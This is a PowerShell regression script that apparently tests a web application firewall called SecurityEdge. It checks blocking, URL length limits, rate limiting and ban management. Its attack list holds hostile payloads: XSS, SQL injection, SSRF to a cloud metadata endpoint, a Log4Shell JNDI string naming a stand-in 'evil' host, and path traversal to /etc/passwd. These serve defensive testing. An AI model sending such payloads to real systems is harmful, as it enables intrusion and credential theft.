param(
    [string]$Config = "",
    [string]$BaseUrl = "",
    [string]$AdminUrl = "",
    [string]$Token = "",
    [int]$BurstRequests = 60,
    [string]$EnvFile = "",
    [switch]$NoEnv
)

$ErrorActionPreference = "Stop"
if ($NoEnv -and $EnvFile) { throw "-EnvFile and -NoEnv cannot be used together." }
. "$PSScriptRoot\dotenv.ps1"

$configEnvironmentPreexisting = $null -ne (Get-Item -LiteralPath Env:SECURITYEDGE_CONFIG -ErrorAction SilentlyContinue)
$loadedEnv = $null
if (-not $NoEnv) {
    $explicitEnv = if ($EnvFile) { $EnvFile } else { Get-NonEmptyEnvironmentValue SECURITYEDGE_ENV_FILE }
    $loadedEnv = Import-ApplicationDotEnv -ExplicitPath $explicitEnv -Candidates @((Join-Path $PSScriptRoot "..\.env"))
    if ($loadedEnv) { Write-Host "Loaded environment: $loadedEnv" -ForegroundColor DarkGray }
}

$configPath = Resolve-EffectiveConfigPath -ExplicitValue $Config -EnvironmentVariable SECURITYEDGE_CONFIG `
    -EnvironmentWasPreexisting $configEnvironmentPreexisting -LoadedEnvPath $loadedEnv `
    -Candidates @((Join-Path $PSScriptRoot "..\configs\securityedge.json"))
if (-not (Test-Path -LiteralPath $configPath -PathType Leaf)) { throw "Configuration file not found: $configPath" }
$configObject = Get-Content (Resolve-Path -LiteralPath $configPath) -Raw | ConvertFrom-Json
$configObject = Apply-SecurityEdgeEnvironmentOverrides -ConfigObject $configObject
if (-not $BaseUrl) { $BaseUrl = Get-SecurityEdgePublicBaseUrlFromConfig -ConfigObject $configObject }
if (-not $AdminUrl) {
    $AdminUrl = Get-LocalHttpUrlFromListenAddress -ListenAddress ([string]$configObject.admin.listen_addr)
}
if (-not $Token) { $Token = [string]$configObject.admin.auth_token }

$headers = @{ Authorization = "Bearer $Token" }
function Section([string]$Text) { Write-Host "`n=== $Text ===" -ForegroundColor Cyan }

Section "WAF categories"
$attacks = @(
    "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "/login?username=admin%27%20OR%201%3D1--",
    "/fetch?url=http://169.254.169.254/latest/meta-data",
    "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D",
    "/download?file=..%2F..%2Fetc%2Fpasswd"
)
foreach ($path in $attacks) {
    $status = & curl.exe -s -o NUL -w "%{http_code}" "$BaseUrl$path"
    if ($status -ne "403") { throw "Expected 403 for $path, got $status" }
    Write-Host "[OK] 403 $path" -ForegroundColor Green
}

Section "Protocol size limit"
$longPath = "a" * 5000
$status = & curl.exe -s -o NUL -w "%{http_code}" "$BaseUrl/$longPath"
if ($status -ne "414") { throw "Expected 414 for oversized path, got $status" }
Write-Host "[OK] 414 oversized path" -ForegroundColor Green

Section "Hierarchical rate limit and auto-ban"
$codes = @{}
for ($i = 1; $i -le $BurstRequests; $i++) {
    $status = & curl.exe -s -o NUL -w "%{http_code}" "$BaseUrl/flood?i=$i"
    if (-not $codes.ContainsKey($status)) { $codes[$status] = 0 }
    $codes[$status]++
}
$codes.GetEnumerator() | Sort-Object Name | Format-Table Name, Value -AutoSize
if (-not $codes.ContainsKey("429")) { throw "No request was rate limited." }

Section "Protection state"
Invoke-RestMethod "$AdminUrl/api/v1/status" -Headers $headers | ConvertTo-Json -Depth 20
Invoke-RestMethod "$AdminUrl/api/v1/bans" -Headers $headers | ConvertTo-Json -Depth 20

Section "Clear temporary bans"
Invoke-RestMethod "$AdminUrl/api/v1/bans" -Headers $headers -Method Delete | ConvertTo-Json -Depth 10
Write-Host "Protection tests completed." -ForegroundColor Green
